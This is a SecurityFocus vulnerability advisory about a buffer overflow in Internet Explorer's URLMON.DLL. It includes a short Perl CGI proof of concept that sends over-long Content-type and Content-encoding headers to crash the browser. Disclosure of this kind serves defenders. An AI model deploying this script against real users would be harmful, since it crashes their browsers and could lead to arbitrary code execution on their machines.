source: http://www.securityfocus.com/bid/7419/info

A vulnerability has been discovered in Microsoft Internet Explorer. Due to insufficient bounds checking performed by URLMON.DLL it may be possible for a malicious web server to trigger a buffer overflow. This could result in the execution of arbitrary code within the context of the client user. 

#!/usr/bin/perl 
# 
# Name this file as "urlmon-bo.cgi" 
$LONG="A"x300; 
print "Content-type: $LONG\r\n"; 
print "Content-encoding: $LONG\r\n"; 
print "\r\n"; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8- -